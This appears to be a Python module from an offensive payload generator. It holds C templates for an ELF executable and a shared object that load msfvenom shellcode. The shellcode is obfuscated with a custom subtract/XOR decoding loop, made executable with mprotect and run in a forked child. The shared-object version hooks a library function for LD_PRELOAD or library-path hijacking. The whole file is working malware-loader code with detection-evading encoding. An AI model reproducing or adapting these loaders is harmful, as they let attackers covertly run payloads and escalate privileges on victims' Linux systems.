template_c_elf = """#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

// MSFVENOM
SHELLCODE

int main(int argc, char **argv)
{
    pid_t pid = fork();

    if (pid == -1) {
        perror("fork");
        return -1;
    }

    if (pid == 0) {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        void *aligned_buf = (void *)((intptr_t)buf & ~(pagesize - 1));
        if (mprotect(aligned_buf, pagesize, PROT_READ | PROT_WRITE)) {
            perror("mprotect RW");
            return -1;
        }

        int arraysize = (int) sizeof(buf);
        for (int i = 0; i < arraysize; i++) {
            buf[i] = (buf[i] - 17) & 0xFF;
            buf[i] = buf[i] ^ 0x74;
            buf[i] = (buf[i] - 5) & 0xFF;
            buf[i] = buf[i] ^ 0x79;
        }

        if (mprotect(aligned_buf, pagesize, PROT_READ | PROT_EXEC)) {
            perror("mprotect RX");
            return -1;
        }
        
        int (*ret)() = (int(*)())buf;
        ret();
    }

    return 0;
}"""

template_c_so = """#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// MSFVENOM
SHELLCODE

uid_t FILENAME(void)
{
    typeof(FILENAME) *old_FILENAME;
    FILENAME = dlsym(RTLD_NEXT, "FILENAME");

    if (fork() == 0)
    {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        void *aligned_buf = (void *)((intptr_t)buf & ~(pagesize - 1));
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),pagesize, PROT_READ|PROT_WRITE))
        {
            perror("mprotect RW");
            return -1;
        }
        
        int arraysize = (int) sizeof(buf);
        for (int i = 0; i < arraysize; i++) {
            buf[i] = (buf[i] - 17) & 0xFF;
            buf[i] = buf[i] ^ 0x74;
            buf[i] = (buf[i] - 5) & 0xFF;
            buf[i] = buf[i] ^ 0x79;
        }
    
        if (mprotect(aligned_buf, pagesize, PROT_READ | PROT_EXEC)) {
            perror("mprotect RX");
            return -1;
        }
        
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else
    {
        printf("HACK: returning from function...");
        return (*old_FILENAME)();
    }
    printf("HACK: Returning from main...");
    return -2;
}"""

templates_dict = {
    "elf": template_c_elf,
    "so-libpath": template_c_so,
    "so-preload": template_c_so,
}
